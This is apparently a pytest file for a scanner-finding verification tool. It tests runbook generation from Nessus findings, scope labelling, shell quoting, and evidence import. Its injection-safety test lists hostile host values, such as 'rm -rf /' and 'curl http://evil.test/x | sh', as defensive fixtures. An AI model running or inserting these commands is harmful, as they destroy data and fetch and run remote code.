"""Runbook generation and manual-capture import (roadmap v4.0).

What these tests defend:

* every finding leaves the builder with something to do -- a command or an
  explicit manual task, never nothing;
* a generated command is the *same* command ``run`` would execute, because both
  come from the adapter's ``build_argv``;
* scope labels a command, it does not delete it: an engagement with no scope
  configured still produces a usable runbook, and an out-of-scope target is
  emitted commented-out with its reason;
* a hostile scanner field cannot become a second shell command;
* captured output round-trips back into evidence with a hash, idempotently,
  and a missing capture is reported rather than treated as an absence of the
  condition.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from nessus_builder import default_host_props, nessus_document, report_host, report_item
from vapt_verify.adapters import get_adapter
from vapt_verify.adapters.base import ExecutionContext
from vapt_verify.cli.main import main
from vapt_verify.importers.nessus_xml import NessusImporter
from vapt_verify.models.engagement import Engagement
from vapt_verify.reconciliation.gate import reconcile
from vapt_verify.runbook.builder import RunbookBuilder
from vapt_verify.runbook.ingest import IngestStatus, RunbookIngestor, split_capture
from vapt_verify.runbook.models import CommandStatus, Runbook
from vapt_verify.runbook.render import (
    ps_quote,
    sh_quote,
    to_json,
    to_markdown,
    to_powershell,
    to_shell,
)
from vapt_verify.workspace import EngagementWorkspace

# --- fixtures ---------------------------------------------------------------

ITEMS: list[dict[str, object]] = [
    # a TLS finding: openssl primary, testssl + nmap supporting
    {"plugin_id": "51192", "plugin_name": "SSL Certificate Cannot Be Trusted",
     "port": 443, "protocol": "tcp", "severity": 2, "svc_name": "https",
     "risk_factor": "Medium", "synopsis": "The SSL certificate cannot be trusted."},
    # an SSH finding
    {"plugin_id": "90317", "plugin_name": "SSH Weak Algorithms Supported",
     "port": 22, "protocol": "tcp", "severity": 2, "svc_name": "ssh",
     "risk_factor": "Medium", "synopsis": "Weak SSH algorithms are supported."},
    # a host-level local check: NO remote command is appropriate
    {"plugin_id": "123456", "plugin_name": "Ubuntu Security Update for OpenSSL (Host-Level)",
     "port": 0, "severity": 3, "family": "Ubuntu Local Security Checks",
     "risk_factor": "High", "synopsis": "A local package is out of date."},
    # informational
    {"plugin_id": "11219", "plugin_name": "Nessus SYN scanner",
     "port": 8080, "protocol": "tcp", "severity": 0, "svc_name": "http",
     "synopsis": "Informational port note."},
]


def _nessus(tmp_path: Path, ip: str = "192.0.2.10", fqdn: str = "web01.example-doc.test") -> Path:
    host = report_host(
        name=ip,
        props=default_host_props(ip, fqdn=fqdn),
        items=[report_item(**item) for item in ITEMS],  # type: ignore[arg-type]
    )
    path = tmp_path / "scan.nessus"
    path.write_text(nessus_document(hosts=[host]), encoding="utf-8")
    return path


def _workspace(tmp_path: Path, engagement: Engagement) -> EngagementWorkspace:
    ws = EngagementWorkspace.create(tmp_path / "engagements" / engagement.engagement_id, engagement)
    source = _nessus(tmp_path)
    result = NessusImporter(engagement_id=engagement.engagement_id).import_file(source)
    ws.persist_import(source_path=source, result=result, reconciliation=reconcile(result))
    return ws


@pytest.fixture
def unscoped_ws(tmp_path: Path) -> EngagementWorkspace:
    """The situation that made `run` useless: an engagement with no scope set."""
    return _workspace(tmp_path, Engagement(engagement_id="eng-unscoped", client_alias="Demo"))


@pytest.fixture
def scoped_ws(tmp_path: Path) -> EngagementWorkspace:
    return _workspace(
        tmp_path,
        Engagement(
            engagement_id="eng-scoped",
            client_alias="Demo",
            approved_cidrs=["192.0.2.0/24"],
            authorisation_reference="AUTH-2026-001",
        ),
    )


def _build(ws: EngagementWorkspace):
    return RunbookBuilder().build(
        engagement=ws.engagement(), findings=ws.load_findings(), assets=ws.load_assets()
    )


# --- coverage: nothing is dropped -------------------------------------------

def test_every_finding_gets_an_entry(scoped_ws: EngagementWorkspace) -> None:
    findings = scoped_ws.load_findings()
    runbook = _build(scoped_ws)
    assert len(runbook.entries) == len(findings)
    assert {e.finding_id for e in runbook.entries} == {f["finding_id"] for f in findings}


def test_every_entry_has_a_command_or_an_explicit_manual_task(
    scoped_ws: EngagementWorkspace,
) -> None:
    """The runbook's half of 'no finding disappeared'."""
    runbook = _build(scoped_ws)
    for entry in runbook.entries:
        assert entry.is_accounted_for, (
            f"{entry.finding_id} ({entry.plugin_name}) produced no command, no manual "
            "evidence task and no explicit retain decision, so an operator would have "
            "nothing to do with it"
        )
    coverage = runbook.coverage()
    assert coverage.is_complete
    assert (
        coverage.with_runnable_command + coverage.manual_only + coverage.retained_only
        == coverage.entries
    )


def test_informational_findings_are_not_scanned_by_default(
    scoped_ws: EngagementWorkspace,
) -> None:
    """Informational findings report state, not a condition to confirm.

    Probing them spends the operator's time on noise. They are still carried --
    dropping them would break the no-finding-disappears guarantee -- but they
    get no command.
    """
    runbook = _build(scoped_ws)
    informational = [e for e in runbook.entries if e.severity == "INFORMATIONAL"]
    assert informational, "fixture no longer contains an informational finding"
    for entry in informational:
        assert entry.retained_only
        assert not entry.commands
        assert not entry.manual_tasks
        assert entry.is_accounted_for, "retained is a decision, not an omission"

    # ...and the scripts say so rather than staying silent about them.
    for text in (to_shell(runbook), to_powershell(runbook)):
        assert "RETAINED, NOT SCANNED" in text
        assert informational[0].plugin_name in text
    assert "Retained, not scanned" in to_markdown(runbook)


def test_include_informational_restores_their_commands(
    scoped_ws: EngagementWorkspace,
) -> None:
    runbook = RunbookBuilder().build(
        engagement=scoped_ws.engagement(),
        findings=scoped_ws.load_findings(),
        assets=scoped_ws.load_assets(),
        include_informational=True,
    )
    informational = [e for e in runbook.entries if e.severity == "INFORMATIONAL"]
    assert informational
    assert not any(e.retained_only for e in informational)
    assert any(e.commands or e.manual_tasks for e in informational)


def test_capture_paths_are_readable_not_hashes(scoped_ws: EngagementWorkspace) -> None:
    """`asset-f12da461b6465376/find-37c3608975b2529abc91d78b/` helps nobody."""
    runbook = _build(scoped_ws)
    paths = [c.output_file for c in runbook.commands]
    assert paths
    for path in paths:
        host, folder, _name = path.split("/")
        assert host == "192.0.2.10", host
        assert folder.split("-")[0] in {"1", "2", "3", "4", "5"}
        assert "find-" not in path
        assert "asset-" not in path
    assert any("SSL-Certificate-Cannot-Be-Trusted" in p for p in paths)


def test_local_patch_finding_gets_manual_evidence_not_a_port_scan(
    scoped_ws: EngagementWorkspace,
) -> None:
    """A remote scan cannot verify a local package version, and must not pretend to."""
    runbook = _build(scoped_ws)
    entry = next(e for e in runbook.entries if "Ubuntu Security Update" in e.plugin_name)
    assert entry.nmap_role == "inappropriate"
    assert not entry.commands, "a local-check finding must not be handed a remote probe"
    assert entry.manual_tasks
    assert any(t.adapter in {"credentialed", "administrative"} for t in entry.manual_tasks)


# --- the commands are real, and identical to what `run` would execute -------

def test_tls_finding_produces_an_openssl_command_with_sni(
    scoped_ws: EngagementWorkspace,
) -> None:
    runbook = _build(scoped_ws)
    entry = next(e for e in runbook.entries if "Certificate" in e.plugin_name)
    openssl = next(c for c in entry.commands if c.adapter == "openssl")
    assert openssl.argv[:3] == ["openssl", "s_client", "-connect"]
    assert "192.0.2.10:443" in openssl.argv
    # SNI is the whole reason a certificate finding needs more than an IP.
    assert "-servername" in openssl.argv
    assert "web01.example-doc.test" in openssl.argv
    assert openssl.status is CommandStatus.READY


def test_nmap_command_carries_the_recipe_scripts(scoped_ws: EngagementWorkspace) -> None:
    runbook = _build(scoped_ws)
    entry = next(e for e in runbook.entries if "SSH Weak Algorithms" in e.plugin_name)
    nmap = next(c for c in entry.commands if c.adapter == "nmap")
    assert nmap.argv[0] == "nmap"
    assert "--script" in nmap.argv
    assert "ssh2-enum-algos" in nmap.argv[nmap.argv.index("--script") + 1]
    assert "22" in nmap.argv


def test_inprocess_tcp_check_becomes_a_netcat_command(tmp_path: Path) -> None:
    """An in-process step must not tell a remote operator to run it locally.

    The TCP-connect adapter runs inside vapt-verify, but the whole premise of a
    runbook is that the operator is on a *different* machine. `nc -vz` reports
    the same thing and, like the adapter, proves exposure and nothing more.
    """
    host = report_host(
        name="192.0.2.30",
        props=default_host_props("192.0.2.30"),
        items=[report_item(plugin_id="999001", plugin_name="Unknown Service Exposed",
                           port=9001, protocol="tcp", severity=1, svc_name="unknown",
                           family="Service detection")],
    )
    path = tmp_path / "exposure.nessus"
    path.write_text(nessus_document(hosts=[host]), encoding="utf-8")
    ws = EngagementWorkspace.create(
        tmp_path / "eng", Engagement(engagement_id="eng-tcp", approved_cidrs=["192.0.2.0/24"])
    )
    result = NessusImporter(engagement_id="eng-tcp").import_file(path)
    ws.persist_import(source_path=path, result=result, reconciliation=reconcile(result))

    runbook = _build(ws)
    entry = runbook.entries[0]
    assert entry.recipe_id == "port-service-exposure"
    nc = next(c for c in entry.commands if c.tool == "nc")
    assert nc.argv == ["nc", "-vz", "-w", "5", "192.0.2.30", "9001"]
    assert "reachability only" in nc.description
    assert "step " in to_shell(runbook)


def test_recipe_selection_ignores_the_generating_machine_toolset(
    scoped_ws: EngagementWorkspace,
) -> None:
    """A runbook written on a bare Windows laptop must match one written on Kali.

    Classifying against locally installed tools would downgrade findings to
    "capability unavailable" purely because the machine holding the scan file
    has no security tooling -- exactly the machine a runbook exists to serve.
    """
    from vapt_verify.classification.models import Capabilities

    bare = RunbookBuilder(capabilities=Capabilities(available=set())).build(
        engagement=scoped_ws.engagement(),
        findings=scoped_ws.load_findings(),
        assets=scoped_ws.load_assets(),
    )
    fully_equipped = RunbookBuilder(
        capabilities=Capabilities(available={"nmap", "openssl", "testssl.sh", "ssh-audit"})
    ).build(
        engagement=scoped_ws.engagement(),
        findings=scoped_ws.load_findings(),
        assets=scoped_ws.load_assets(),
    )
    assert [c.argv for c in bare.commands] == [c.argv for c in fully_equipped.commands]
    assert [e.recipe_id for e in bare.entries] == [e.recipe_id for e in fully_equipped.entries]
    # Local availability is still reported -- as advice, not as a filter.
    assert any(not c.tool_present_locally for c in bare.commands)
    assert all(c.tool_present_locally for c in fully_equipped.commands if c.tool != "nc")


def test_generated_command_matches_what_the_executor_would_run(
    scoped_ws: EngagementWorkspace,
) -> None:
    """Runbook and executor must never drift: both call ``build_argv``.

    If they diverged, the operator would capture evidence for one command while
    the PoC document claimed another.
    """
    runbook = _build(scoped_ws)
    for command in runbook.commands:
        adapter = get_adapter(command.adapter)
        assert adapter is not None
        ctx = ExecutionContext(
            finding_id=command.finding_id,
            asset_id=command.asset_id,
            engagement_id="",
            target=command.target,
            port=command.port,
            transport=command.transport,
            params=dict(command.params),
            timeout=float(command.timeout),
        )
        assert adapter.build_argv(ctx) == command.argv, (
            f"{command.adapter} runbook argv differs from the adapter's build_argv"
        )


# --- scope labels, it does not delete ---------------------------------------

def test_unconfigured_scope_still_produces_runnable_commands(
    unscoped_ws: EngagementWorkspace,
) -> None:
    """The regression this feature exists for.

    ``run`` returns BLOCKED_OUT_OF_SCOPE with an empty command when no scope is
    configured, so an operator setting up a fresh workspace got no commands at
    all. Generating text is not executing, so the runbook must still deliver.
    """
    runbook = _build(unscoped_ws)
    assert not runbook.scope_configured
    commands = [c for c in runbook.commands if c.argv]
    assert commands, "an unscoped engagement must still yield commands to run"
    assert all(c.status is CommandStatus.SCOPE_UNCONFIRMED for c in commands)
    assert all(c.runnable for c in commands)
    # ...but the operator is told the tool could not confirm authorisation.
    assert all("authorisation" in c.scope_reason.lower() for c in commands)
    script = to_shell(runbook)
    assert "CONFIRM AUTHORISATION" in script


def test_out_of_scope_target_is_commented_out_not_deleted(tmp_path: Path) -> None:
    ws = _workspace(
        tmp_path,
        Engagement(engagement_id="eng-elsewhere", approved_cidrs=["198.51.100.0/24"]),
    )
    runbook = _build(ws)
    commands = [c for c in runbook.commands if c.argv]
    assert commands
    assert all(c.status is CommandStatus.OUT_OF_SCOPE for c in commands)
    assert all(not c.runnable for c in commands)

    script = to_shell(runbook)
    for line in script.splitlines():
        if line.startswith("step "):
            pytest.fail(f"an out-of-scope command was emitted as runnable: {line}")
    # The command is still visible, with its reason, so nothing is hidden.
    assert "NOT RUN:" in script
    assert "OUT OF SCOPE" in script
    assert "openssl" in script


def test_scope_summary_names_the_approved_ranges(scoped_ws: EngagementWorkspace) -> None:
    runbook = _build(scoped_ws)
    assert runbook.scope_configured
    assert any("192.0.2.0/24" in s for s in runbook.scope_summary)


# --- injection safety --------------------------------------------------------

@pytest.mark.parametrize(
    "hostile",
    [
        "192.0.2.10; rm -rf /",
        "192.0.2.10 && curl http://evil.test/x | sh",
        "$(id)",
        "`id`",
        "192.0.2.10\nrm -rf /",
        "'; DROP TABLE findings; --",
    ],
)
def test_hostile_target_never_becomes_a_command(tmp_path: Path, hostile: str) -> None:
    """A scan file is untrusted input; a mangled host field must not run."""
    host = report_host(
        name=hostile,
        props={"host-ip": hostile, "HOST_START": "Mon Jul 20 09:00:00 2026"},
        items=[report_item(plugin_id="51192", plugin_name="SSL Certificate Cannot Be Trusted",
                           port=443, protocol="tcp", severity=2, svc_name="https")],
    )
    path = tmp_path / "hostile.nessus"
    path.write_text(nessus_document(hosts=[host]), encoding="utf-8")
    ws = EngagementWorkspace.create(
        tmp_path / "eng", Engagement(engagement_id="eng-hostile", approved_cidrs=["192.0.2.0/24"])
    )
    result = NessusImporter(engagement_id="eng-hostile").import_file(path)
    ws.persist_import(source_path=path, result=result, reconciliation=reconcile(result))

    runbook = _build(ws)
    for command in runbook.commands:
        assert command.status is CommandStatus.UNSAFE_TARGET
        assert command.argv == []
    script = to_shell(runbook)
    for line in script.splitlines():
        assert not line.startswith("step "), f"hostile target produced a runnable step: {line}"
    # The finding is still present and still actionable -- just not automatically.
    assert all(e.is_accounted_for for e in runbook.entries)


def test_sh_quote_neutralises_shell_metacharacters() -> None:
    for value in ["a; rm -rf /", "$(id)", "`id`", "a'b", "a b", "a\nb", "*"]:
        quoted = sh_quote(value)
        assert quoted.startswith("'") and quoted.endswith("'")
        # Round-trip through the shell's own parser: the argument must survive
        # intact, which is only true if nothing was expanded or split.
        import subprocess

        out = subprocess.run(
            ["/bin/sh", "-c", f"printf %s {quoted}"], capture_output=True, text=True, check=True
        )
        assert out.stdout == value


def test_ps_quote_doubles_single_quotes() -> None:
    assert ps_quote("a'b") == "'a''b'"
    assert ps_quote("$(id)") == "'$(id)'"


# --- rendering ---------------------------------------------------------------

def test_shell_script_is_valid_bash(scoped_ws: EngagementWorkspace, tmp_path: Path) -> None:
    script = tmp_path / "runbook.sh"
    script.write_text(to_shell(_build(scoped_ws)), encoding="utf-8")
    import subprocess

    result = subprocess.run(["bash", "-n", str(script)], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr


def test_shell_script_does_not_abort_on_a_nonzero_probe_exit(
    scoped_ws: EngagementWorkspace,
) -> None:
    """`set -e` would stop the run at the first closed port -- and a non-zero
    exit is not a verdict anyway."""
    script = to_shell(_build(scoped_ws))
    commands = [line.strip() for line in script.splitlines() if not line.startswith("#")]
    assert "set -u" in commands
    assert not [c for c in commands if c.startswith("set -e") or c.startswith("set -ue")]


def test_rendered_outputs_warn_that_a_result_is_not_a_verdict(
    scoped_ws: EngagementWorkspace,
) -> None:
    runbook = _build(scoped_ws)
    for text in (to_shell(runbook), to_markdown(runbook), to_powershell(runbook)):
        lowered = text.lower()
        assert "exit code is not a verdict" in lowered
        assert "closed port is not a" in lowered


def test_markdown_lists_what_confirms_and_what_refutes(scoped_ws: EngagementWorkspace) -> None:
    markdown = to_markdown(_build(scoped_ws))
    assert "**Confirms the finding:**" in markdown
    assert "**Contradicts the finding:**" in markdown
    assert "Save output to" in markdown


def test_json_manifest_round_trips(scoped_ws: EngagementWorkspace) -> None:
    runbook = _build(scoped_ws)
    restored = Runbook.from_dict(json.loads(to_json(runbook)))
    assert len(restored.entries) == len(runbook.entries)
    assert [c.argv for c in restored.commands] == [c.argv for c in runbook.commands]
    assert [c.status for c in restored.commands] == [c.status for c in runbook.commands]


def test_output_paths_are_unique_per_step(scoped_ws: EngagementWorkspace) -> None:
    """Two steps sharing an output file would overwrite each other's evidence."""
    runbook = _build(scoped_ws)
    paths = [c.output_file for c in runbook.commands] + [
        t.output_file for t in runbook.manual_tasks
    ]
    assert len(paths) == len(set(paths))
    for path in paths:
        assert ".." not in path
        assert not path.startswith("/")


# --- ingest ------------------------------------------------------------------

CAPTURE = """# step: {step_id}
# command: openssl s_client -connect 192.0.2.10:443 -brief
# started: 2026-07-29T10:00:00Z

CONNECTION ESTABLISHED
Protocol version: TLSv1.2
Peer certificate: CN = web01.example-doc.test
Verification error: self-signed certificate

# exit_code: 0
# finished: 2026-07-29T10:00:01Z
"""


def _capture_openssl(runbook: Runbook, capture_dir: Path) -> str:
    command = next(c for c in runbook.commands if c.adapter == "openssl")
    path = capture_dir / command.output_file
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(CAPTURE.format(step_id=command.step_id), encoding="utf-8")
    return command.finding_id


def test_split_capture_removes_the_wrapper_the_script_wrote() -> None:
    body, exit_code = split_capture(CAPTURE.format(step_id="find-x-1"))
    assert exit_code == 0
    assert "CONNECTION ESTABLISHED" in body
    # The '# command:' line names -brief; if it reached the parser it could be
    # mistaken for tool output.
    assert "# command:" not in body
    assert "# step:" not in body


def test_split_capture_passes_through_a_hand_saved_file() -> None:
    body, exit_code = split_capture("CONNECTION ESTABLISHED\nProtocol version: TLSv1.3\n")
    assert exit_code is None
    assert "CONNECTION ESTABLISHED" in body


def test_ingest_records_evidence_with_parsed_observations(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    finding_id = _capture_openssl(runbook, capture_dir)

    report = RunbookIngestor(scoped_ws, operator="tester").ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    assert len(report.of_status(IngestStatus.IMPORTED)) == 1

    evidence = [e for e in scoped_ws.load_evidence() if e["finding_id"] == finding_id]
    assert len(evidence) == 1
    record = evidence[0]
    assert record["sha256"]
    assert record["operator"] == "tester"
    assert record["command_args"][0] == "openssl"
    # The adapter parsed the real capture, not a guess about its format.
    assert record["parsed_observations"]["connected"] is True
    assert record["parsed_observations"]["self_signed_indicated"] is True
    assert record["parsed_observations"]["capture_source"] == "manual_runbook_capture"
    assert Path(record["raw_evidence_path"]).exists()


def test_ingest_never_sets_a_verdict(scoped_ws: EngagementWorkspace, tmp_path: Path) -> None:
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    finding_id = _capture_openssl(runbook, capture_dir)
    RunbookIngestor(scoped_ws).ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    finding = next(f for f in scoped_ws.load_findings() if f["finding_id"] == finding_id)
    assert finding["verdict"] == "unreviewed", (
        "importing evidence must not decide the finding; a reviewer does"
    )
    # Nor may the adapter's *suggestion* become a decision on the way in.
    assert not scoped_ws.load_decisions()


def test_ingest_is_idempotent(scoped_ws: EngagementWorkspace, tmp_path: Path) -> None:
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    _capture_openssl(runbook, capture_dir)
    ingestor = RunbookIngestor(scoped_ws)
    first = ingestor.ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    second = ingestor.ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    assert len(first.of_status(IngestStatus.IMPORTED)) == 1
    assert len(second.of_status(IngestStatus.IMPORTED)) == 0
    assert len(second.of_status(IngestStatus.ALREADY_IMPORTED)) == 1
    assert len(scoped_ws.load_evidence()) == 1


def test_a_skipped_tool_is_a_capability_gap_not_an_absence(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    command = next(c for c in runbook.commands if c.adapter == "nmap")
    marker = capture_dir / f"{command.output_file}.skipped"
    marker.parent.mkdir(parents=True, exist_ok=True)
    marker.write_text("# SKIPPED: nmap is not installed on this machine.\n", encoding="utf-8")

    report = RunbookIngestor(scoped_ws).ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    skipped = report.of_status(IngestStatus.TOOL_SKIPPED)
    assert any(i.step_id == command.step_id for i in skipped)
    item = next(i for i in skipped if i.step_id == command.step_id)
    assert "not evidence that the condition is absent" in item.note
    assert not scoped_ws.load_evidence()


def test_empty_capture_is_reported_not_imported(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    command = next(c for c in runbook.commands if c.adapter == "openssl")
    path = capture_dir / command.output_file
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(f"# step: {command.step_id}\n# exit_code: 1\n", encoding="utf-8")

    report = RunbookIngestor(scoped_ws).ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    assert len(report.of_status(IngestStatus.EMPTY_CAPTURE)) == 1
    assert not scoped_ws.load_evidence()


def test_ingest_reports_findings_that_still_have_no_evidence(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    capture_dir.mkdir()
    finding_id = _capture_openssl(runbook, capture_dir)

    report = RunbookIngestor(scoped_ws).ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    assert finding_id not in report.findings_without_evidence
    # Everything else is still bare, and says so instead of quietly passing.
    assert len(report.findings_without_evidence) == len(runbook.entries) - 1
    assert report.outstanding_manual_tasks


def test_ingest_handles_a_utf8_bom_capture(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """PowerShell's Out-File writes a BOM; the header stripper must survive it."""
    runbook = _build(scoped_ws)
    capture_dir = tmp_path / "capture"
    command = next(c for c in runbook.commands if c.adapter == "openssl")
    path = capture_dir / command.output_file
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(CAPTURE.format(step_id=command.step_id), encoding="utf-8-sig")

    report = RunbookIngestor(scoped_ws).ingest(
        runbook=runbook, capture_dir=capture_dir, engagement_id="eng-scoped"
    )
    imported = report.of_status(IngestStatus.IMPORTED)
    assert len(imported) == 1
    record = scoped_ws.load_evidence()[0]
    assert "# step:" not in record["stdout"]
    assert record["parsed_observations"]["connected"] is True


# --- CLI end-to-end ----------------------------------------------------------

def test_cli_runbook_then_import_round_trip(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    base = tmp_path / "engagements"
    ws = _workspace(
        tmp_path,
        Engagement(engagement_id="eng-cli", approved_cidrs=["192.0.2.0/24"]),
    )
    assert ws.root.parent == base

    assert main(["runbook", "--base", str(base), "--engagement", "eng-cli",
                 "--output", str(tmp_path / "rb")]) == 0
    out = capsys.readouterr().out
    assert "findings covered:" in out
    for name in ("runbook.sh", "runbook.ps1", "runbook.md", "runbook.json"):
        assert (tmp_path / "rb" / name).exists(), f"{name} was not written"

    manifest = json.loads((tmp_path / "rb" / "runbook.json").read_text(encoding="utf-8"))
    runbook = Runbook.from_dict(manifest)
    capture_dir = tmp_path / "capture"
    _capture_openssl(runbook, capture_dir)

    assert main(["evidence", "import", "--base", str(base), "--engagement", "eng-cli",
                 "--manifest", str(tmp_path / "rb" / "runbook.json"),
                 "--capture-dir", str(capture_dir), "--operator", "tester"]) == 0
    out = capsys.readouterr().out
    assert "imported:          1" in out
    assert "no verdict was set" in out
    assert len(ws.load_evidence()) == 1


def test_cli_runbook_always_writes_the_json_manifest(tmp_path: Path) -> None:
    """A runbook you cannot re-import is only half the workflow."""
    base = tmp_path / "engagements"
    _workspace(tmp_path, Engagement(engagement_id="eng-md", approved_cidrs=["192.0.2.0/24"]))
    assert main(["runbook", "--base", str(base), "--engagement", "eng-md",
                 "--format", "md", "--output", str(tmp_path / "rb")]) == 0
    assert (tmp_path / "rb" / "runbook.md").exists()
    assert (tmp_path / "rb" / "runbook.json").exists()
    assert not (tmp_path / "rb" / "runbook.sh").exists()


def test_runbook_covers_findings_the_legacy_nmap_export_misses(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The contrast that motivated the whole project.

    The legacy exporter emitted commands only for plugin names in a hard-coded
    list, so everything else silently vanished from the operator's worklist.
    The runbook must account for all of it.
    """
    base = tmp_path / "engagements"
    ws = _workspace(
        tmp_path, Engagement(engagement_id="eng-contrast", approved_cidrs=["192.0.2.0/24"])
    )
    findings = ws.load_findings()

    assert main(["legacy", "export-nmap", "--base", str(base),
                 "--engagement", "eng-contrast"]) == 0
    legacy_lines = [
        line for line in capsys.readouterr().out.splitlines() if line.startswith("nmap ")
    ]

    runbook = _build(ws)
    assert len(runbook.entries) == len(findings)
    assert all(e.is_accounted_for for e in runbook.entries)
    assert len(legacy_lines) < len(findings), (
        "fixture no longer demonstrates the legacy gap; adjust it"
    )


def test_cli_import_without_a_manifest_explains_how_to_make_one(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    base = tmp_path / "engagements"
    _workspace(tmp_path, Engagement(engagement_id="eng-nomanifest"))
    code = main(["evidence", "import", "--base", str(base), "--engagement", "eng-nomanifest"])
    assert code == 2
    assert "vapt-verify runbook" in capsys.readouterr().out
